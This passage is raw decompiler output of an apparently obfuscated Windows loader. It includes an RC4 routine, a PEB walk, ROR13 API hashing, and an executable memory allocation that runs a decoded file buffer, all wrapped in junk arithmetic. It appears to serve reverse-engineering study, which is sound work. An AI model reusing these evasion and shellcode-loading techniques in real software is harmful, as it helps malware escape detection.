  unsigned int v6; // esi
  _BYTE *v7; // eax
  char v8; // cl
  int v9; // eax
  unsigned __int8 v10; // bl
  unsigned __int8 *v11; // [esp+4h] [ebp-8h]
  unsigned __int8 v12; // [esp+Bh] [ebp-1h]

  v6 = 0;
  v7 = a3;
  do
  {
    v8 = v6++;
    *v7++ = v8;
  }
  while ( v6 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v12 = 0;
  v10 = 0;
  v11 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v10 = (v10 + *v11 + *(unsigned __int8 *)(a1 + v12)) % 256;
    sub_40A98D(&a3[i], &a3[v10]);
    v9 = v12 + 1;
    v4 = v9 % a2;
    result = v9 / a2;
    v12 = v4;
    ++v11;
  }
  return result;
}

//----- (0040A3DE) --------------------------------------------------------
unsigned int __cdecl sub_40A3DE(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (0040A6D2) --------------------------------------------------------
unsigned int __usercall sub_40A6D2@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<esi>)
{
  int v4; // ecx
  bool v5; // cf
  int v6; // ebx
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  dword_437024 += a4;
  v4 = a2 + 20481;
  v5 = __CFSHL__(v4, 5);
  v4 *= 32;
  v6 = v5 + a3 + 7694;
  LOBYTE(v4) = byte_438AE4 + v4;
  dword_438AAD ^= a1 + 1203;
  LOBYTE(dword_43703C) = dword_43703C - 31;
  dword_437030 = 20935;
  result = retaddr & 0xFFFF0000;
  BYTE1(v6) = dword_438AAD;
  dword_438AD7 = retaddr & 0xFFFF0000;
  dword_437044 = v6;
  dword_43702C = v4;
  return result;
}
// 437024: using guessed type int dword_437024;
// 43702C: using guessed type int dword_43702C;
// 437030: using guessed type int dword_437030;
// 43703C: using guessed type int dword_43703C;
// 437044: using guessed type int dword_437044;
// 438AAD: using guessed type int dword_438AAD;
// 438AD7: using guessed type int dword_438AD7;
// 438AE4: using guessed type char byte_438AE4;

//----- (0040A82E) --------------------------------------------------------
void sub_40A82E()
{
  int v0; // eax
  int v1; // edx

  dword_43700C = 5496;
  dword_437018 += (int)&InterlockedCompareExchange;
  v0 = dword_438B4F ^ (dword_438B4F << 11);
  v1 = dword_438AE7;
  dword_438B4F = dword_438AE7;
  LOBYTE(dword_437024) = dword_437024 + 114;
  dword_438AE7 = dword_438A9D;
  dword_438A9D = dword_438B5F;
  dword_437044 = v0;
  dword_437028 = dword_438B5F;
  LOBYTE(dword_437038) = dword_437038 + 10;
  dword_437038 += v0 - (__CFADD__(dword_4389B8, dword_4375B4 + v1 + 8143) + 5915);
  JUMPOUT(0x409AE8);
}
// 40BFFF: control flows out of bounds to 409AE8
// 43700C: using guessed type int dword_43700C;
// 437018: using guessed type int dword_437018;
// 437024: using guessed type int dword_437024;
// 437028: using guessed type int dword_437028;
// 437038: using guessed type int dword_437038;
// 437044: using guessed type int dword_437044;
// 4375B4: using guessed type int dword_4375B4;
// 4389B8: using guessed type int dword_4389B8;
// 438A9D: using guessed type int dword_438A9D;
// 438AE7: using guessed type int dword_438AE7;
// 438B4F: using guessed type int dword_438B4F;
// 438B5F: using guessed type int dword_438B5F;

//----- (0040A98D) --------------------------------------------------------
_BYTE *__cdecl sub_40A98D(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (0040B52D) --------------------------------------------------------
void __stdcall sub_40B52D(int a1)
{
  ;
}

//----- (0040B8F1) --------------------------------------------------------
DWORD (__stdcall **__usercall sub_40B8F1@<eax>(int a1@<esi>))()
{
  DWORD (__stdcall **result)(); // eax
  int v2; // eax
  unsigned __int8 *v3; // esi
  struct _PEB *v4; // edx
  _DWORD *v5; // edx
  DWORD (__stdcall **v6)(); // ebx
  int v7; // ecx
  void (__stdcall **v8)(DWORD); // ebx
  int v9; // edi

  dword_437040 = a1;
  v4 = NtCurrentPeb();
  dword_43700C = (unsigned __int8)dword_437460;
  v5 = (_DWORD *)*((_DWORD *)v4->ImageBaseAddress + 5);
  v6 = &GetTickCount;
  do
  {
    dword_43701C = (int)v6;
    v3 = (unsigned __int8 *)v5[10];
    v7 = 24;
    v9 = 0;
    do
    {
      dword_437024 += 29732;
      v2 = *v3++;
      dword_43700C += 315;
      v8 = &Sleep;
      if ( (char)v2 >= 97 )
      {
        LOBYTE(v2) = v2 - 32;
        v8 = (void (__stdcall **)(DWORD))(v3 + 1386);
      }
      dword_437030 += 24378;
      dword_437028 += (int)v8;
      dword_437038 -= (int)v8;
      v9 = v2 + __ROR4__(v9, 13);
      dword_437040 = 1559;
      --v7;
    }
    while ( v7 );
    v6 = (DWORD (__stdcall **)())v5[4];
    v5 = (_DWORD *)*v5;
  }
  while ( v9 != 1783282779 );
  result = v6;
  LOBYTE(dword_43702C) = dword_43702C - 115;
  dword_437030 -= 9344;
  return result;
}
// 43700C: using guessed type int dword_43700C;
// 43701C: using guessed type int dword_43701C;
// 437024: using guessed type int dword_437024;
// 437028: using guessed type int dword_437028;
// 43702C: using guessed type int dword_43702C;
// 437030: using guessed type int dword_437030;
// 437038: using guessed type int dword_437038;
// 437040: using guessed type int dword_437040;
// 437460: using guessed type int dword_437460;

//----- (0040BD6B) --------------------------------------------------------
char *__usercall sub_40BD6B@<eax>(int a1@<esi>, int a2)
{
  unsigned int i; // esi
  DWORD (__stdcall **v4)(); // eax
  DWORD (__stdcall **v5)(); // ebx
  _DWORD *v6; // edi
  unsigned __int16 *v7; // [esp+10h] [ebp-Ch]
  _DWORD *v8; // [esp+14h] [ebp-8h]
  int v9; // [esp+18h] [ebp-4h]

  v4 = sub_40B8F1(a1);
  v5 = v4;
  v6 = (DWORD (__stdcall **)())((char *)v4 + *(_DWORD *)((char *)v4[15] + (_DWORD)v4 + 120));
  if ( HIWORD(a2) )
  {
    v8 = (DWORD (__stdcall **)())((char *)v4 + v6[8]);
    v7 = (unsigned __int16 *)((char *)v4 + v6[9]);
    for ( i = 0; v6[6] > i; ++i )
    {
      if ( sub_40A3DE((_BYTE *)v5 + *v8) == a2 )
      {
        v9 = *v7;
        break;
      }
      ++v8;
      ++v7;
    }
    if ( v6[6] == i )
      return 0;
  }
  else
  {
    v9 = (unsigned __int16)a2 - v6[4];
  }
  return *(char **)((char *)&v5[v9] + v6[7]) + (_DWORD)v5;
}
// 40AF42: variable 'v9' is possibly undefined

//----- (0040C4BB) --------------------------------------------------------
char *__usercall sub_40C4BB@<eax>(bool a1@<cf>, int a2@<esi>)
{
  LONG (__stdcall **v2)(volatile LONG *, LONG, LONG); // ecx
  int v3; // ebx
  int v4; // ecx
  int v5; // ecx
  char *result; // eax
  int v7; // ecx
  signed int v8; // esi
  int v9; // ecx
  int v10; // ebx
  _BYTE *v11; // esi
  int v12; // edx
  int v13; // eax
  int v14; // ebx
  int v15; // ecx
  char v16; // al
  int v17; // edx
  int v18; // edx
  int v19; // ebx
  _BYTE *v20; // ebx
  _BYTE *v21; // edi
  int v22; // esi
  int v23; // edi
  int v24; // ecx
  _BYTE *v25; // edi
  int v26; // esi
  int v27; // eax
  int v28; // esi
  int v29; // ecx
  _BYTE *v30; // edi
  BOOL (__stdcall **v31)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED); // ebx
  __int64 v32; // rdi
  int v33; // ecx
  int v34; // edx
  int v35; // ebx
  int v36; // [esp-8h] [ebp-8h]
  int v37; // [esp-4h] [ebp-4h]
  int v38; // [esp-4h] [ebp-4h]
  int v39; // [esp-4h] [ebp-4h]

  v33 = 0x2000;
  v34 = a1 + a2 + 18225;
  dword_437038 = 17286;
  v21 = &unk_424E5E;
  v22 = (int)&unk_424E5E;
  do
  {
    dword_437008 += v22;
    v38 = v33;
    dword_437024 = v34;
    v22 = dword_437350;
    sub_40A82E();
    a1 = (unsigned __int8)dword_437018 < 0xBBu;
    LOBYTE(dword_437018) = dword_437018 + 69;
    dword_437038 = v22;
    v34 = a1 + v17 + 25585;
    *v21++ = v16;
    BYTE1(v34) -= byte_437854;
    LOBYTE(dword_437010) = 1;
    v33 = v38 - 1;
  }
  while ( v38 != 1 );
  LOBYTE(dword_437040) = 103;
  dword_438B5B(v33 - dword_437F90, v34, 255, &unk_424D5E);
  LOBYTE(dword_437038) = -17;
  v23 = dword_437994;
  dword_437014 += 25813;
  dword_437010 -= 30485;
  dword_437020 = (unsigned __int64)dword_438ACF(
                                     29987,
                                     *(int *)((char *)&dword_438B4F + 1) + v18 + 6905 - dword_437568,
                                     &unk_424D5E,
                                     &unk_438AB9,
                                     0,
                                     &unk_43899E) >> 32;
  dword_437040 -= v23;
  v39 = dword_438B13(
          __CFADD__(dword_4380D8, dword_43764C) + a1 + v24 + 14710 - dword_43833C + 7261,
          &unk_43899E,
          -1073741824,
          1,
          0,
          2,
          32,
          0);
  dword_43702C = 5722;
  dword_438AF7(
    ((unsigned int)&DisableThreadLibraryCalls + 4379) >> 6,
    &InterlockedCompareExchange,
    v39,
    &unk_424E5E,
    0x2000,
    &dword_438AFB,
    0,
    v39);
  dword_43703C = 5890;
  v27 = ((int (*)(void))unk_438B3F)();
  v28 = (int)off_43898C;
  v29 = 0x2000;
  LOBYTE(dword_43702C) = -107;
  v30 = &unk_424E5E;
  dword_437048 += (int)off_43898C;
  v31 = &ReadFile;
  do
  {
    dword_43701C += v28;
    v36 = v29;
    BYTE1(v31) = BYTE1(v27);
    dword_437018 += v28;
    sub_40A82E();
    dword_43700C += (int)v31;
    *v30++ = v27;
    v20 = v30 + 26347;
    v28 = (char)((_BYTE)v30 - 21);
    BYTE1(v20) = byte_43834C;
    v31 = (BOOL (__stdcall **)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))(v20 - 1);
    v29 = v36 - 1;
  }
  while ( v36 != 1 );
  dword_437038 = (char)((_BYTE)v30 - 21);
  LOBYTE(dword_437008) = dword_437008 - 65;
  dword_43703C -= 16301;
  dword_437020 = (int)v31;
  LOBYTE(dword_437040) = 11;
  LOBYTE(dword_437010) = dword_437010 + 15;
  result = sub_40BD6B(v28, 1769630462);
  dword_437030 += 1341;
  LOBYTE(dword_43701C) = dword_43701C - 29;
  if ( result )
  {
    v35 = (int)v31 + 1;
    dword_438AFB = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))result;
    dword_437018 -= 13884;
    LOBYTE(dword_437038) = dword_437038 - 119;
    result = sub_40BD6B(v28 - 21713, 976580703);
    if ( result )
    {
      dword_437028 = v35;
      dword_438B33 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD))result;
      LOBYTE(dword_437044) = dword_437044 + 51;
      dword_437014 += v35;
      dword_437014 -= 29059;
      dword_43700C = v35;
      result = (char *)dword_438AFB(0, 0x2000, 12288, 64);
      if ( result )
      {
        v7 = 14985;
        dword_438B43 = (int)result;
        v8 = (signed int)&GetTickCount - dword_437C24 - dword_43703C;
        dword_43702C = (int)&Sleep;
        LOBYTE(dword_437024) = dword_437024 - 3;
        BYTE1(v7) = 58 - byte_437C18;
        dword_437018 -= v8;
        HIDWORD(v32) = (((unsigned int)v7 | 0x733F00000000i64) + __PAIR64__(v8, dword_437024)) >> 32;
        dword_437024 += v7;
        LODWORD(v32) = HIDWORD(v32);
        v37 = dword_438B13(v7, &unk_43899E, -1073741824, 1, 0, 3, 0, 0);
        v2 = &InterlockedCompareExchange;
        v3 = (__CFADD__(__CFADD__(dword_4376AC, HIDWORD(v32)), HIDWORD(v32)) | __CFADD__(
                                                                                 (((unsigned int)dword_4376AC | 0x107F00000000ui64)
                                                                                + v32) >> 32,
                                                                                 4223))
           + 52042;
        HIDWORD(v32) = dword_437230;
        BYTE1(v2) = ((unsigned __int16)&InterlockedCompareExchange >> 8) - byte_438628;
        dword_437004 -= dword_437230;
        dword_438B0B(v2, dword_4376B0, v37, dword_438B43, 0x2000, &unk_424D5E, 0, v37);
        v5 = a1 + v4 + 17342;
        a1 = HIDWORD(v32) < dword_437C3C;
        HIDWORD(v32) -= dword_437C3C;
        unk_438B3F(a1 + v5 + 17397);
        a1 = (unsigned int)dword_43704C < HIDWORD(v32);
        dword_43704C -= HIDWORD(v32);
        v10 = a1 + v3 + 29016;
        dword_438ABB(&unk_43899E);
        v9 = 0x2000;
        dword_43702C = v10;
        v11 = (_BYTE *)dword_438B43;
        dword_437010 += v10;
        v12 = 0;
        LOBYTE(dword_437004) = dword_437004 + 68;
        dword_437048 = (unsigned __int16)dword_438B43;
        v13 = 0;
        v14 = (int)off_4385A8;
        do
        {
          dword_43701C -= v14;
          LOBYTE(v13) = *v11++;
          v12 += v13;
          v19 = dword_438130 + v13 + v14;
          v13 = 0;
          LOBYTE(dword_43703C) = dword_43703C + 28;
          v14 = v19 ^ 0x3D98;
          --v9;
        }
        while ( v9 );
        dword_438B67 = v12;
        dword_43701C = 25022;
        dword_437004 -= v12;
        dword_437048 += 14;
        dword_438B33(dword_43857C - 1215, dword_438B43, 0, 0x8000);
        dword_437040 = 27041;
        result = 0;
        v15 = 0x2000;
        dword_437028 = 6355;
        v25 = &unk_424E5E;
        v26 = dword_437420 + 12091 - ((((unsigned int)dword_437420 | 0x5E9D00000000ui64) + 12091) >> 32);
        do
        {
          v26 -= 24948;
          *v25++ = 0;
          LOBYTE(dword_437020) = dword_437020 - 112;
          --v15;
        }
        while ( v15 );
        LOBYTE(dword_437014) = -78;
      }
    }
  }
  return result;
}
// 40B01E: conditional instruction was optimized away because of '%0x18.4==1'
// 409BEA: variable 'a1' is possibly undefined
// 409BEA: variable 'v4' is possibly undefined
// 40AA52: variable 'v17' is possibly undefined
// 40AA58: variable 'v16' is possibly undefined
// 40AAAF: variable 'v18' is possibly undefined
// 40B4FA: variable 'v24' is possibly undefined
// 40B1E4: variable 'v27' is possibly undefined
// 437004: using guessed type int dword_437004;
// 437008: using guessed type int dword_437008;
// 43700C: using guessed type int dword_43700C;
// 437010: using guessed type int dword_437010;
// 437014: using guessed type int dword_437014;
// 437018: using guessed type int dword_437018;
// 43701C: using guessed type int dword_43701C;
// 437020: using guessed type int dword_437020;
// 437024: using guessed type int dword_437024;
// 437028: using guessed type int dword_437028;
// 43702C: using guessed type int dword_43702C;
// 437030: using guessed type int dword_437030;
// 437038: using guessed type int dword_437038;
// 43703C: using guessed type int dword_43703C;
// 437040: using guessed type int dword_437040;
// 437044: using guessed type int dword_437044;
// 437048: using guessed type int dword_437048;
// 43704C: using guessed type int dword_43704C;
// 437230: using guessed type int dword_437230;
// 437350: using guessed type int dword_437350;
// 437420: using guessed type int dword_437420;
// 437568: using guessed type int dword_437568;
// 43764C: using guessed type int dword_43764C;
// 4376AC: using guessed type int dword_4376AC;
// 4376B0: using guessed type int dword_4376B0;
// 437854: using guessed type char byte_437854;
// 437994: using guessed type int dword_437994;
// 437C18: using guessed type char byte_437C18;
// 437C24: using guessed type int dword_437C24;
// 437C3C: using guessed type int dword_437C3C;
// 437F90: using guessed type int dword_437F90;
// 4380D8: using guessed type int dword_4380D8;
// 438130: using guessed type int dword_438130;
// 43833C: using guessed type int dword_43833C;
// 43834C: using guessed type char byte_43834C;
// 43857C: using guessed type int dword_43857C;
// 4385A8: using guessed type int **off_4385A8;
// 438628: using guessed type char byte_438628;
// 43898C: using guessed type void *off_43898C;
// 438A64: using guessed type int dword_438A64;
// 438ABB: using guessed type int (__stdcall *dword_438ABB)(_DWORD);
// 438ACF: using guessed type __int64 (__fastcall *dword_438ACF)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438AF7: using guessed type int (__fastcall *dword_438AF7)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438AFB: using guessed type int (__stdcall *dword_438AFB)(_DWORD, _DWORD, _DWORD, _DWORD);
// 438B0B: using guessed type int (__fastcall *dword_438B0B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438B13: using guessed type int (__thiscall *dword_438B13)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438B33: using guessed type int (__thiscall *dword_438B33)(_DWORD, _DWORD, _DWORD, _DWORD);
// 438B3F: using guessed type int (__thiscall *unk_438B3F)(_DWORD);
// 438B43: using guessed type int dword_438B43;
// 438B4F: using guessed type int dword_438B4F;
// 438B5B: using guessed type int (__fastcall *dword_438B5B)(_DWORD, _DWORD, _DWORD, _DWORD);
// 438B67: using guessed type int dword_438B67;

// nfuncs=29 queued=29 decompiled=29 lumina nreq=0 worse=0 better=0
// ALL OK, 29 function(s) have been successfully decompiled
